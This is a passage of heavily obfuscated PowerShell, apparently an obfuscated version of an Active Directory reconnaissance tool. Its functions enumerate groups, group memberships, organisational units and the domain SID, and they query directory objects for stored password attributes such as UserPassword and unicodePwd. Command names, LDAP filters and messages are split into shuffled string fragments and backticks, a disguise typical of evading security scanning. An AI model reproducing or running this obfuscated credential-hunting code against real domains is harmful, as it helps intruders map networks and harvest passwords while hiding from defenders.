            ${a`DuSErs} = &("{0}{1}{2}{3}" -f 'G','et-AD','Obje','ct') -LDAPFilter ((("{8}{1}{4}{3}{9}{5}{12}{2}{10}{0}{7}{11}{6}{13}" -f '=*)(unic','UWZ','x','UserPasswo','(','*)','word','odePwd=*)(msSFU3','(','rd=','UserPassword','0Pass','(Uni','=*))'))."R`epla`Ce"(([ChAR]85+[ChAR]87+[ChAR]90),'|')) -ResultPageSize ${pA`g`EsIZe} -Properties ('*')
        }
        Catch
        {
            &("{1}{2}{4}{0}{3}" -f 'a','Wr','ite','rning','-W') ("{8}{9}{5}{4}{7}{0}{3}{10}{2}{1}{11}{6}" -f 'utes] Error while ','sword At','ing Pas','enume','sswor','DRPa','utes','dAttrib','[','Get-A','rat','trib')
            &("{0}{1}{2}" -f'Writ','e-Verbo','se') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`Ull}
        }

        If (${AdU`Se`RS})
        {
            &("{1}{3}{2}{0}" -f 'g','Wr','n','ite-Warni') "[*] Total PasswordAttribute Objects: $([ADRecon.ADWSClass]::ObjectCount($ADUsers)) "
            ${Us`ero`BJ} = ${AD`U`seRs}
            &("{2}{4}{0}{1}{3}" -f 'Vari','a','Remov','ble','e-') ("{0}{1}{2}" -f'A','DUse','rs')
        }
    }

    If (${mE`T`hoD} -eq ("{0}{1}" -f 'LDA','P'))
    {
        ${oB`jS`EarcheR} = &("{3}{0}{2}{1}"-f'O','ect','bj','New-') ("{7}{5}{0}{2}{6}{3}{8}{1}{4}" -f 'ry','ear','Se','ces.Di','cher','m.Directo','rvi','Syste','rectoryS') ${O`BjDoma`In}
        ${o`Bj`sE`ARcher}."paGe`S`IZe" = ${pa`gE`SI`ze}
        ${O`BJ`Sea`RCHEr}."f`IlteR" = ((("{10}{8}{14}{5}{3}{7}{1}{2}{0}{6}{16}{4}{11}{15}{12}{13}{9}"-f'=*)','ixUserPass','word','ord=*)(','odeP','w','(uni','Un','R18','ssword=*))','(','wd=*)(','0P','a','(UserPass','msSFU3','c'))-REPLacE  'R18',[ChAr]124)
        ${O`BJS`e`ARcHeR}."Se`A`RChSco`Pe" = ("{2}{1}{0}"-f'btree','u','S')
        Try
        {
            ${Ad`U`SERS} = ${OBJSEaR`C`HEr}.("{0}{1}"-f 'Fi','ndAll').Invoke()
        }
        Catch
        {
            &("{1}{2}{0}" -f 'g','Writ','e-Warnin') ("{10}{4}{17}{6}{2}{8}{13}{15}{14}{3}{11}{16}{19}{0}{12}{9}{20}{18}{1}{7}{5}" -f'at','ttri','ribu','while','et-ADRPassw','tes','t','bu','te','ng','[G',' enu','i','s] Er',' ','ror','me','ordAt','A','r',' Password ')
            &("{3}{0}{2}{1}" -f'ite','bose','-Ver','Wr') "[EXCEPTION] $($_.Exception.Message) "
            Return ${Nu`ll}
        }
        ${o`BjseAr`CHer}.("{1}{2}{0}" -f 'e','dispo','s').Invoke()

        If (${ad`U`Sers})
        {
            ${c`Nt} =  (ls  VarIAblE:d761P  ).VAlUE::("{2}{1}{3}{0}" -f'Count','je','Ob','ct').Invoke(${aD`UseRS})
            If (${c`NT} -gt 0)
            {
                &("{3}{2}{1}{0}"-f 'g','in','te-Warn','Wri') ('[*]'+' '+'Tota'+'l '+'Pa'+'sswor'+'dA'+'ttribute '+'Obje'+'cts:'+' '+"$cnt")
            }
            ${use`Ro`BJ} = ${A`dus`erS}
            &("{0}{2}{3}{1}" -f'Remove-Va','e','ria','bl') ("{1}{2}{0}"-f 's','A','DUser')
        }
    }

    If (${usE`Robj})
    {
        Return ${Us`eRoBJ}
    }
    Else
    {
        Return ${Nu`LL}
    }
}

Function G`ET-a`DR`Group
{

    param(
        [Parameter(ManDAtoRy = ${TR`Ue})]
        [string] ${M`EtHOd},

        [Parameter(mANdatory = ${TR`UE})]
        [DateTime] ${d`AtE},

        [Parameter(mANdAtORy = ${f`Al`SE})]
        [DirectoryServices.DirectoryEntry] ${Objd`Om`A`In},

        [Parameter(MaNDaTory = ${t`RuE})]
        [int] ${P`AG`EsIZE},

        [Parameter(manDAToRy = ${f`A`LSe})]
        [int] ${T`h`ReaDs} = 10,

        [Parameter(MAndATORY = ${tr`Ue})]
        [string] ${a`DrO`UtPUT`D`IR},

        [Parameter(mandatORy = ${tr`UE})]
        [array] ${oUtPU`TT`YpE},

        [Parameter(manDATorY = ${f`AlsE})]
        [bool] ${aDRgRO`U`pS} = ${tr`UE},

        [Parameter(mAnDAToRY = ${FAL`SE})]
        [bool] ${ADRgROup`ch`AN`gES} = ${F`AL`SE}
    )

    If (${M`eTh`OD} -eq ("{1}{0}"-f'WS','AD'))
    {
        Try
        {
            ${ADGr`OU`pS} = @( &("{2}{1}{3}{0}"-f 'p','o','Get-ADGr','u') -Filter * -ResultPageSize ${Pa`g`esiZe} -Properties ("{0}{1}{2}"-f 'Admin','Coun','t'),("{0}{1}{3}{2}"-f'Cano','ni','e','calNam'),("{3}{2}{0}{1}" -f 'i','shedName','ingu','Dist'),("{3}{1}{2}{0}"-f 'tion','s','crip','De'),("{2}{1}{0}"-f'ry','ego','GroupCat'),("{1}{0}{3}{2}" -f'r','G','Scope','oup'),("{2}{0}{3}{1}" -f'a','Name','S','mAccount'),("{0}{1}"-f 'S','ID'),("{2}{1}{0}" -f 'story','DHi','SI'),("{0}{1}" -f'managed','By'),("{3}{1}{0}{2}" -f'eMe','alu','taData','msDS-ReplV'),("{1}{3}{2}{0}"-f'ged','wh','nChan','e'),("{3}{1}{0}{2}" -f'n','e','Created','wh') )
        }
        Catch
        {
            &("{0}{1}{2}"-f 'W','r','ite-Warning') ("{3}{9}{5}{6}{7}{2}{4}{12}{0}{10}{1}{11}{8}" -f 'numerating',' ','p] E','[Ge','rror w','R','G','rou','jects','t-AD',' Group','Ob','hile e')
            &("{2}{1}{0}"-f 'rbose','Ve','Write-') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`Ull}
        }

        If (${A`DGRou`PS})
        {
            &("{2}{0}{1}"-f'o','se','Write-Verb') "[*] Total Groups: $([ADRecon.ADWSClass]::ObjectCount($ADGroups)) "
            If (${A`D`RgROU`pS})
            {
                ${Gr`o`UpoBJ} =   (  itEM  ("VaRIA"+"bl"+"e:It"+"3v9E")  ).valUe::("{0}{2}{1}" -f 'GroupPar','er','s').Invoke(${a`D`gROUPs}, ${THR`EADs})
            }
            If (${A`Drg`RoUpC`haN`Ges})
            {
                ${G`ROupChange`SoBj} =   (  GET-vAriABlE  ('IT3V'+'9e')  ).VAluE::("{2}{3}{0}{4}{1}" -f 'ChangeP','ser','Gr','oup','ar').Invoke(${ADG`R`OuPs}, ${DA`TE}, ${T`hREA`ds})
            }
            &("{0}{4}{2}{3}{1}" -f'Rem','e','r','iabl','ove-Va') ("{1}{2}{0}"-f 'ps','A','DGrou')
            &("{1}{3}{0}{4}{2}"-f 'Va','R','e','emove-','riabl') ("{0}{2}{1}" -f'ADRGr','ups','o')
            &("{0}{2}{1}{3}"-f 'Remove','Va','-','riable') ("{2}{4}{3}{0}{1}"-f'ng','es','A','Cha','DRGroup')
        }
    }

    If (${MeT`hOd} -eq ("{0}{1}" -f'LD','AP'))
    {
        ${Objse`Arc`HER} = &("{1}{2}{3}{0}" -f 't','N','ew-Obje','c') ("{3}{4}{5}{7}{8}{6}{0}{2}{1}"-f'h','r','e','System.Di','r','ec','Searc','toryS','ervices.Directory') ${Obj`D`O`MAIn}
        ${o`BjSeA`RcH`ER}."Page`SIzE" = ${PaG`eS`izE}
        ${ob`JsEaRCH`ER}."fi`ltEr" = ("{0}{1}{2}{3}" -f'(obj','ectClass','=g','roup)')
        ${oB`JSEAr`C`Her}."PrOpERT`iEstOL`OaD".("{1}{2}{0}"-f 'Range','A','dd').Invoke((("{1}{0}{2}{3}" -f 'in','adm','coun','t'),("{0}{1}{2}{3}" -f'c','anoni','ca','lname'), ("{2}{0}{3}{1}"-f'istinguishedn','me','d','a'), ("{1}{2}{0}" -f'ption','d','escri'), ("{0}{1}{2}" -f 'g','roup','type'),("{4}{0}{1}{2}{3}"-f'acco','un','tn','ame','sam'), ("{0}{1}{2}"-f'si','dhi','story'), ("{2}{1}{0}" -f'dby','age','man'), ("{4}{3}{0}{1}{2}" -f 'u','emetadat','a','replval','msds-'), ("{2}{0}{1}"-f 'jec','tsid','ob'), ("{2}{0}{1}"-f 'create','d','when'), ("{0}{2}{3}{1}"-f'w','ed','hencha','ng')))
        ${o`BJs`EARcHeR}."seAR`CHsc`ope" = ("{0}{2}{1}"-f'Subt','e','re')

        Try
        {
            ${aD`G`RoUPs} = ${oBj`Searc`hER}.("{0}{1}" -f 'Fi','ndAll').Invoke()
        }
        Catch
        {
            &("{3}{1}{2}{0}" -f'g','e-','Warnin','Writ') ("{7}{5}{1}{12}{2}{6}{8}{4}{9}{11}{0}{10}{3}"-f'merating','RGrou',' ','Group Objects',' w','D','Err','[Get-A','or','hile en',' ','u','p]')
            &("{0}{2}{1}" -f 'Wr','ose','ite-Verb') "[EXCEPTION] $($_.Exception.Message) "
            Return ${nu`lL}
        }
        ${O`BjSE`AR`CHER}.("{2}{1}{0}" -f 'ose','p','dis').Invoke()

        If (${a`D`gRoUPS})
        {
            &("{3}{0}{1}{2}"-f 'it','e','-Verbose','Wr') "[*] Total Groups: $([ADRecon.LDAPClass]::ObjectCount($ADGroups)) "
            If (${a`d`Rgrou`Ps})
            {
                ${g`Ro`UPobj} =  (  vARiAbLe ("D7"+"61p") -vAL)::("{0}{1}{2}" -f 'Gr','ou','pParser').Invoke(${Ad`GRoupS}, ${Th`REAdS})
            }
            If (${A`Drg`ROupcH`ANgeS})
            {
                ${gRO`UPcH`A`NgEsObJ} =   $D761p::("{2}{3}{1}{0}" -f'er','ePars','Gro','upChang').Invoke(${aD`grOU`pS}, ${DA`TE}, ${THrEa`Ds})
            }
            &("{3}{1}{0}{2}{4}"-f'ov','em','e-Varia','R','ble') ("{2}{0}{1}"-f'G','roups','AD')
            &("{3}{2}{1}{0}{4}"-f'e-Va','ov','em','R','riable') ("{0}{2}{1}"-f 'ADR','roups','G')
            &("{3}{4}{1}{2}{0}"-f 'le','ar','iab','Remo','ve-V') ("{1}{2}{0}{3}{4}" -f'Gr','AD','R','oupChang','es')
        }
    }

    If (${gROu`PO`Bj})
    {
        &("{1}{3}{0}{2}" -f'D','Expor','R','t-A') -ADRObj ${gR`Ou`pobJ} -ADROutputDir ${AdR`o`UT`pUTdir} -OutputType ${OutP`UtTY`pe} -ADRModuleName ("{1}{0}"-f'ups','Gro')
        &("{2}{3}{0}{4}{1}"-f'ove-Var','ble','Re','m','ia') ("{2}{1}{0}" -f'pObj','rou','G')
    }

    If (${G`Ro`UpCh`AnGeSobj})
    {
        &("{1}{2}{0}{3}" -f 'ort-A','Ex','p','DR') -ADRObj ${G`RO`Upc`hANGES`OBJ} -ADROutputDir ${a`dROuT`put`dIR} -OutputType ${oUT`puT`TYPE} -ADRModuleName ("{2}{0}{1}"-f'an','ges','GroupCh')
        &("{3}{0}{2}{1}{4}" -f'move-','ria','Va','Re','ble') ("{1}{2}{0}" -f 'sObj','Gro','upChange')
    }
}

Function GEt-aDR`G`RouP`meMbeR
{

    param(
        [Parameter(MAndatORy = ${TR`Ue})]
        [string] ${m`et`hod},

        [Parameter(MaNdAtOry = ${f`A`LSE})]
        [DirectoryServices.DirectoryEntry] ${ob`Jd`OmaiN},

        [Parameter(MandATORy = ${t`RUE})]
        [int] ${Pa`GE`sIze},

        [Parameter(mandAToRY = ${F`ALsE})]
        [int] ${T`HrE`ADs} = 10
    )

    If (${M`eT`Hod} -eq ("{1}{0}" -f 'S','ADW'))
    {
        Try
        {
            ${AdDo`m`Ain} = &("{2}{3}{1}{0}"-f'ain','DDom','Get-','A')
            ${AdD`Om`AInS`ID} = ${aDdo`ma`In}."d`oMain`SId"."vA`lUE"
            &("{2}{1}{4}{0}{3}" -f'aria','mo','Re','ble','ve-V') ("{2}{1}{0}"-f'n','DDomai','A')
        }
        Catch
        {
            &("{3}{2}{0}{1}" -f'-Wa','rning','rite','W') ("{0}{2}{7}{9}{3}{8}{4}{1}{6}{5}"-f'[Ge','on','t','] Error ge','ng Domain C','xt','te','-ADRGroupMem','tti','ber')
            &("{0}{2}{1}" -f 'Wr','e-Verbose','it') "[EXCEPTION] $($_.Exception.Message) "
            Return ${nU`ll}
        }

        Try
        {
            ${ADgRo`U`ps} = ${Ad`G`ROUPs} = @( &("{3}{0}{2}{1}"-f 'r','up','o','Get-ADG') -Filter * -ResultPageSize ${PagEs`I`zE} -Properties ("{4}{0}{2}{1}{3}"-f 'Ac','ountNam','c','e','Sam'),("{0}{1}" -f'SI','D') )
        }
        Catch
        {
            &("{2}{1}{0}" -f 'Warning','ite-','Wr') ("{6}{7}{2}{4}{1}{3}{11}{9}{8}{5}{10}{0}" -f 'ts','ber] Error ','Grou','whil','pMem','oup Obj','[','Get-ADR','ng Gr','ti','ec','e enumera')
            &("{1}{2}{0}" -f'bose','Write-','Ver') "[EXCEPTION] $($_.Exception.Message) "
        }

        Try
        {
            ${aD`G`ROUpM`embERs} = @( &("{1}{3}{0}{2}"-f'-ADO','Ge','bject','t') -LDAPFilter ((("{5}{7}{9}{2}{8}{6}{10}{0}{4}{1}{3}" -f'd','*','berof=','))','=','(','rimarygro','{0}(me','*)(p','m','upi')) -F [cHaR]124) -Properties ("{3}{2}{1}{0}{5}{4}" -f 'hedN','guis','istin','D','me','a'),("{0}{1}{2}" -f'Ob','ject','Class'),("{2}{1}{0}"-f'f','ro','membe'),("{0}{3}{2}{1}"-f'pri','oupID','aryGr','m'),("{0}{3}{2}{1}" -f'sAMA','e','ountNam','cc'),("{3}{1}{0}{2}" -f 'accountty','m','pe','sa') )
        }
        Catch
        {
            &("{1}{3}{0}{2}" -f'rni','Write-W','ng','a') ("{11}{12}{9}{7}{4}{1}{6}{3}{10}{2}{8}{13}{0}{5}" -f 'bje','ber] E',' ','l','m','cts','rror whi','e','enumerati','-ADRGroupM','e','[','Get','ng GroupMember O')
            &("{1}{2}{4}{0}{3}" -f'o','Write-V','e','se','rb') "[EXCEPTION] $($_.Exception.Message) "
            Return ${nU`lL}
        }

        If ( (${A`DdoMA`in`sID}) -and (${aD`g`RoU`PS}) -and (${ad`g`R`oUPmemb`Ers}) )
        {
            &("{3}{1}{2}{0}{4}" -f'bo','ite-Ve','r','Wr','se') "[*] Total GroupMember Objects: $([ADRecon.ADWSClass]::ObjectCount($ADGroupMembers)) "
            ${g`RoupM`e`MberoBj} =  (  gET-CHildITeM variAble:it3V9E).VALuE::("{3}{1}{0}{2}" -f 'rP','mbe','arser','GroupMe').Invoke(${a`D`Gr`oupS}, ${A`D`gr`O`UPMemBeRs}, ${a`DdoM`Ains`Id}, ${thrEA`ds})
            &("{0}{1}{2}"-f'Re','move-Varia','ble') ("{2}{0}{1}"-f 'oup','s','ADGr')
            &("{4}{0}{2}{3}{1}"-f 'e','riable','mov','e-Va','R') ("{0}{2}{1}" -f'ADG','oupMembers','r')
            &("{0}{1}{2}{3}" -f 'Re','move-V','ariab','le') ("{0}{2}{1}"-f'A','SID','DDomain')
        }
    }

    If (${M`EthOD} -eq ("{1}{0}"-f'DAP','L'))
    {

        If (${CrED`E`NTi`Al} -ne   ( VarIABlE ('nK'+'5P') -vaLUEoNl  )::"E`mpTY")
        {
            ${d`OMA`i`NFQdN} = &("{2}{0}{1}" -f'DNtoFQ','DN','Get-')(${o`BJdOMA`In}."d`I`Stin`GU`ishEDNAMe")
            ${dO`main`COn`TeXT} = &("{2}{0}{1}" -f '-Ob','ject','New') ("{9}{2}{6}{5}{14}{10}{0}{7}{11}{8}{12}{13}{15}{4}{3}{1}"-f'ces.Act','ryContext','m','cto','ory.Dire','irector','.D','i','e','Syste','Servi','v','Di','r','y','ect')(("{0}{2}{1}" -f'D','n','omai'),$(${domaI`NFq`dn}),$(${CrE`D`eN`TIal}."usEr`Na`ME"),$(${CRE`D`en`TiAl}.("{1}{2}{4}{0}{3}" -f'ede','Ge','tNetwo','ntial','rkCr').Invoke()."PaSsWO`Rd"))
            Try
            {
                ${addOm`A`In} =   $LbFUd2::("{0}{1}{2}" -f'G','etDomai','n').Invoke(${D`omaI`Nc`ontexT})
            }
            Catch
            {
                &("{2}{0}{1}{3}{4}"-f'it','e','Wr','-','Warning') ("{5}{7}{3}{1}{9}{4}{6}{8}{2}{10}{0}{11}"-f 'main ','ADRGroup','ror g','t-','m','[G','b','e','er] Er','Me','etting Do','Context')
                &("{0}{1}{2}{3}"-f 'Write-','V','erb','ose') "[EXCEPTION] $($_.Exception.Message) "
                Return ${n`Ull}
            }
            &("{2}{0}{3}{1}"-f'e-','le','Remov','Variab') ("{1}{0}{2}"-f'ai','Dom','nContext')
            Try
            {
                ${forESTcO`N`TE`Xt} = &("{1}{2}{0}"-f't','N','ew-Objec') ("{13}{15}{12}{6}{2}{1}{8}{5}{0}{7}{11}{3}{9}{4}{14}{10}" -f 'ActiveDirectory.D','y','or','ry','n','es.','.Direct','irec','Servic','Co','xt','to','m','Syst','te','e')(("{0}{1}" -f 'F','orest'),$(${Ad`dO`m`AiN}."F`OrEst"),$(${C`ReDEn`TIal}."Use`RnAMe"),$(${CReDE`NTi`Al}.("{0}{2}{3}{1}"-f 'GetN','al','etworkCreden','ti').Invoke()."p`Assw`OrD"))
                ${a`dFO`RE`sT} =   $yDLzCG::("{2}{0}{1}"-f'ore','st','GetF').Invoke(${fO`R`EStcoNT`eXt})
            }
            Catch
            {
                &("{2}{3}{1}{0}"-f 'ing','-Warn','Wr','ite') ("{10}{5}{6}{9}{8}{3}{4}{2}{1}{0}{7}" -f 'x','onte','t C',' Fo','res','M','ember] Er','t',' getting','ror','[Get-ADRGroup')
                &("{2}{0}{3}{1}" -f'-','bose','Write','Ver') "[EXCEPTION] $($_.Exception.Message) "
            }
            If (${fo`REstC`O`NTEXT})
            {
                &("{2}{1}{4}{3}{0}" -f 'able','ove-','Rem','ri','Va') ("{3}{2}{1}{0}"-f 'stContext','re','o','F')
            }
            If (${Ad`Fo`ReSt})
            {
                ${G`loBalCa`T`ALoG} = ${AdFor`E`st}.("{4}{3}{2}{0}{1}"-f 'oba','lCatalog','l','dG','Fin').Invoke()
            }
            If (${GlObal`CA`T`Al`og})
            {
                ${DN} = "GC://$($GlobalCatalog.IPAddress)/$($objDomain.distinguishedname)"
                Try
                {
                    ${a`D`oBJeCT} = &("{0}{2}{1}"-f'New','t','-Objec') -TypeName ("{3}{4}{1}{2}{6}{5}{0}" -f'ntry','toryS','ervice','Sy','stem.Direc','ectoryE','s.Dir') -ArgumentList ($(${DN}),$(${C`Red`eNt`ial}."USe`R`NAMe"),$(${C`R`eDeNTIaL}.("{2}{0}{1}{3}{4}"-f 'etNet','workCrede','G','nti','al').Invoke()."paS`sWOrD"))
                    ${aDDO`MAIN`S`id} = &("{2}{0}{1}" -f'-','Object','New') ("{2}{8}{3}{11}{5}{1}{0}{7}{4}{6}{10}{9}" -f '.','ipal','Sys','rit','cu','c','rit','Se','tem.Secu','fier','yIdenti','y.Prin')(${A`D`OBjeCt}."obJ`Ec`T`sId"[0], 0)
                    ${ADobJ`e`CT}.("{1}{0}" -f 'spose','Di').Invoke()
                }
                Catch
                {
                    &("{3}{0}{1}{2}"-f'e-Warn','i','ng','Writ') "[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                    &("{4}{1}{2}{0}{3}"-f 'Verb','e','-','ose','Writ') "[EXCEPTION] $($_.Exception.Message) "
                    ${AddoM`A`iNsId} = &("{0}{2}{1}"-f 'New-','ject','Ob') ("{5}{8}{9}{7}{4}{0}{3}{1}{10}{6}{2}" -f'cipa','cu','tyIdentifier','l.Se','.Prin','S','i','ty','yst','em.Securi','r')(${OBJ`dom`Ain}."O`BJECtS`Id"[0], 0)
                }
            }
            Else
            {
                ${a`DDOma`INS`Id} = &("{2}{0}{1}"-f'w-O','bject','Ne') ("{2}{3}{4}{1}{8}{9}{5}{6}{0}{7}" -f'de','rity.P','System.Se','c','u','ecu','rityI','ntifier','rincipal.','S')(${o`BjdomA`In}."oBj`Ec`T`SId"[0], 0)
            }
        }
        Else
        {
            ${Ad`dO`MAIN} =   (  gCI VariAbLe:lBFuD2).VAlUe::("{4}{0}{1}{3}{2}"-f'Current','Dom','in','a','Get').Invoke()
            ${A`D`F`oResT} =   (  Get-ChILditEm VARIAbLe:YDLZCG  ).VaLuE::("{3}{4}{1}{0}{2}" -f'rrentFores','u','t','Get','C').Invoke()
            Try
            {
                ${gL`ObALc`ATa`LoG} = ${ADFORe`St}.("{1}{3}{4}{2}{0}"-f 'og','FindG','lCatal','l','oba').Invoke()
                ${d`N} = "GC://$($GlobalCatalog)/$($objDomain.distinguishedname)"
                ${adOb`j`eCT} = &("{2}{3}{0}{1}" -f 'w','-Object','N','e') -TypeName ("{1}{4}{10}{3}{7}{2}{8}{5}{6}{0}{9}"-f 'yEntr','Sy','Servic','Direct','ste','ec','tor','ory','es.Dir','y','m.') -ArgumentList (${d`N})
                ${a`dDO`maINsID} = &("{1}{0}{2}"-f 'bjec','New-O','t') ("{0}{4}{2}{3}{6}{1}{7}{5}" -f'Syste','cu','ecurity.','Principal.','m.S','ntifier','Se','rityIde')(${a`d`objeCt}."oBj`Ectsid"[0], 0)
                ${A`DO`BJeCt}.("{2}{0}{1}" -f's','pose','di').Invoke()
            }
            Catch
            {
                &("{1}{2}{0}" -f'ning','Write-W','ar') "[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                &("{3}{2}{1}{0}"-f 'erbose','V','te-','Wri') "[EXCEPTION] $($_.Exception.Message) "
                ${AD`DOM`AinS`iD} = &("{0}{1}{2}" -f 'Ne','w-','Object') ("{3}{5}{10}{0}{2}{4}{9}{8}{6}{7}{1}" -f'i','fier','ty.','Syste','Principal.Sec','m.S','dent','i','ityI','ur','ecur')(${O`BjdoM`A`IN}."O`Bje`CtSid"[0], 0)
            }
        }

        ${o`B`JseA`RCHER} = &("{2}{1}{0}"-f 't','Objec','New-') ("{5}{12}{6}{7}{9}{3}{8}{2}{1}{0}{11}{10}{4}" -f 't','.Direc','s','ervi','her','Sys','cto','r','ce','yS','Searc','ory','tem.Dire') ${objd`oM`A`In}
        ${O`BJs`ear`cHEr}."PagES`iZe" = ${Page`SIZE}
        ${oBj`seAR`cher}."fIl`T`ER" = ("{1}{2}{0}{3}{4}"-f'ctCla','(obj','e','ss=g','roup)')
        ${o`BJ`seARCH`eR}."PrOp`erTiEsT`olo`Ad".("{1}{2}{0}" -f'ge','AddR','an').Invoke((("{0}{3}{1}{2}"-f's','o','untname','amacc'), ("{1}{2}{0}" -f'sid','objec','t')))
        ${oB`jseAr`c`heR}."sEA`RChSC`O`pe" = ("{0}{1}" -f 'Sub','tree')

        Try
        {
            ${A`dg`ROU`pS} = ${o`B`JS`earcHer}.("{0}{2}{1}"-f 'F','ll','indA').Invoke()
        }
        Catch
        {
            &("{2}{0}{1}"-f'ite','-Warning','Wr') ("{4}{3}{1}{12}{7}{5}{8}{11}{10}{9}{6}{2}{0}" -f'erating Group Objects','-ADRG','e enum','Get','[','e','l','pM','mber','whi','Error ','] ','rou')
            &("{1}{0}{2}"-f '-Verbos','Write','e') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`ULL}
        }
        ${O`Bj`sea`RChER}.("{0}{1}"-f'di','spose').Invoke()

        ${O`BjsearCH`Er} = &("{1}{0}{3}{2}" -f '-','New','ect','Obj') ("{11}{1}{7}{0}{4}{12}{2}{6}{9}{5}{10}{3}{8}" -f 'r','t','ryServic','c','ect','ry','es.D','em.Di','her','irecto','Sear','Sys','o') ${o`B`jdomAIN}
        ${obj`sE`ARC`hER}."PAge`sIzE" = ${pa`GE`sIzE}
        ${O`Bj`seA`RCHEr}."F`iL`TeR" = ((("{0}{7}{4}{6}{2}{1}{3}{5}"-f'(Xp','ary','(prim','g','mberof=','roupid=*))','*)','O(me'))-cREPLACe  'XpO',[ChAr]124)
        ${O`BjS`earc`hEr}."prOPeRTiEs`To`L`o`Ad".("{1}{0}" -f'Range','Add').Invoke((("{1}{2}{3}{0}"-f'dname','dis','tingu','ishe'), ("{0}{1}{2}" -f'dnsh','ostnam','e'), ("{0}{3}{2}{1}"-f'objec','s','s','tcla'), ("{1}{2}{0}" -f'groupid','prima','ry'), ("{2}{0}{1}"-f'mbero','f','me'), ("{3}{1}{0}{2}"-f 'nam','count','e','samac'), ("{0}{3}{4}{1}{2}"-f 'sa','ountt','ype','m','acc')))
        ${OBJSEA`RC`hEr}."SE`A`RchsCOPe" = ("{0}{1}" -f'Subt','ree')

        Try
        {
            ${ADGR`oU`p`mEMBerS} = ${obJ`S`eaRCHER}.("{1}{0}" -f'ndAll','Fi').Invoke()
        }
        Catch
        {
            &("{1}{0}{2}"-f'te-Warnin','Wri','g') ("{7}{5}{11}{13}{16}{8}{9}{2}{14}{17}{0}{1}{18}{19}{12}{3}{15}{6}{10}{4}" -f 'um','era','E','Gr','ects','t','ember','[Ge','Member]',' ',' Obj','-','g ','A','rror while e','oupM','DRGroup','n','ti','n')
            &("{0}{2}{1}" -f 'Write-V','ose','erb') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`Ull}
        }
        ${Ob`JsE`ARChEr}.("{2}{0}{1}"-f 'spos','e','di').Invoke()

        If ( (${a`ddOma`In`SId}) -and (${adGR`ou`pS}) -and (${ADGr`OuPmeMb`ERS}) )
        {
            &("{1}{2}{0}" -f'-Verbose','Wri','te') "[*] Total GroupMember Objects: $([ADRecon.LDAPClass]::ObjectCount($ADGroupMembers)) "
            ${gRouP`mEmBER`Obj} =   (vARIAbLE D761p  ).valuE::("{5}{0}{3}{2}{1}{4}" -f 'r','rPar','pMembe','ou','ser','G').Invoke(${Ad`G`ROuPs}, ${ADG`ROupm`EMbE`RS}, ${aD`dOMaIn`s`Id}, ${T`hr`EaDS})
            &("{2}{3}{0}{1}"-f'e-V','ariable','Rem','ov') ("{1}{0}{2}"-f 'DGrou','A','ps')
            &("{2}{1}{3}{0}"-f'le','e','R','move-Variab') ("{2}{1}{0}"-f'rs','GroupMembe','AD')
            &("{0}{2}{3}{1}" -f'Rem','able','ov','e-Vari') ("{2}{0}{3}{1}" -f'Doma','SID','AD','in')
        }
    }

    If (${grO`UPme`mbER`obj})
    {
        Return ${g`Roupm`emBe`R`obj}
    }
    Else
    {
        Return ${nu`ll}
    }
}

Function gE`T-Ad`ROU
{

    param(
        [Parameter(MandAtOry = ${T`Rue})]
        [string] ${mE`Th`Od},

        [Parameter(MAndAtoRY = ${f`A`LsE})]
        [DirectoryServices.DirectoryEntry] ${OB`jDom`AIn},

        [Parameter(MANDaTOrY = ${T`RUE})]
        [int] ${P`Ag`ESiZe},

        [Parameter(MaNdAtOry = ${fa`LsE})]
        [int] ${t`H`ReAds} = 10
    )

    If (${Met`hoD} -eq ("{0}{1}" -f'AD','WS'))
    {
        Try
        {
            ${ad`o`Us} = @( &("{0}{2}{3}{4}{5}{1}"-f'Get-A','nalUnit','DO','rganiza','ti','o') -Filter * -Properties ("{3}{1}{0}{2}{4}" -f 'hed','inguis','N','Dist','ame'),("{1}{2}{0}" -f'scription','D','e'),("{0}{1}"-f 'Na','me'),("{2}{1}{0}" -f 'ed','henCreat','w'),("{1}{0}{2}" -f'henCh','w','anged') )
        }
        Catch
        {
            &("{3}{0}{1}{2}" -f'it','e-War','ning','Wr') ("{1}{12}{11}{5}{6}{10}{8}{9}{2}{4}{7}{0}{3}"-f'ct','[Get-A','ra','s','tin','Err','o','g OU Obje',' enum','e','r while','ROU] ','D')
            &("{1}{0}{2}" -f'ite-Ve','Wr','rbose') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`UlL}
        }

        If (${ad`oUs})
        {
            &("{1}{0}{2}{3}" -f '-Ver','Write','b','ose') "[*] Total OUs: $([ADRecon.ADWSClass]::ObjectCount($ADOUs)) "
            ${oUo`Bj} =  (ItEm vaRiaBLE:iT3v9e).vAlUE::("{0}{2}{1}" -f 'OUP','r','arse').Invoke(${a`d`oUS}, ${THrE`Ads})
            &("{1}{0}{2}{3}"-f 'v','Remo','e-Variabl','e') ("{1}{0}"-f's','ADOU')
        }
    }

    If (${m`e`Thod} -eq ("{0}{1}" -f 'LDA','P'))
    {
        ${oB`J`sE`ARCher} = &("{1}{0}{2}" -f 'ew-Obje','N','ct') ("{10}{7}{6}{8}{9}{3}{5}{1}{4}{2}{0}" -f'rcher','recto','Sea','es','ry','.Di','rySe','em.Directo','rv','ic','Syst') ${ObJD`om`AIN}
        ${o`BJSE`A`RcheR}."pa`gEs`IZe" = ${pA`GE`sIzE}
        ${o`BjSEar`ch`Er}."F`ilT`er" = ("{0}{5}{2}{1}{3}{4}"-f '(object','anizati','ass=org','o','nalunit)','cl')
        ${oBJs`ear`cher}."Proper`T`iEsTo`LOaD".("{1}{0}"-f 'ge','AddRan').Invoke((("{2}{0}{1}{3}" -f'gu','ishedna','distin','me'),("{3}{0}{1}{2}"-f 'scr','i','ption','de'),("{1}{0}" -f 'ame','n'),("{0}{2}{1}"-f 'whencre','ted','a'),("{3}{2}{0}{1}" -f 'n','ged','encha','wh')))
        ${oB`j`seArc`HeR}."SeA`Rc`hsC`Ope" = ("{1}{0}" -f'ree','Subt')

        Try
        {
            ${ado`Us} = ${oB`JseAr`C`HeR}.("{1}{0}" -f 'ndAll','Fi').Invoke()
        }
        Catch
        {
            &("{1}{2}{0}"-f 'arning','Wr','ite-W') ("{6}{3}{5}{7}{2}{1}{4}{0}"-f 'Objects','numerating ',' while e','Get','OU ','-AD','[','ROU] Error')
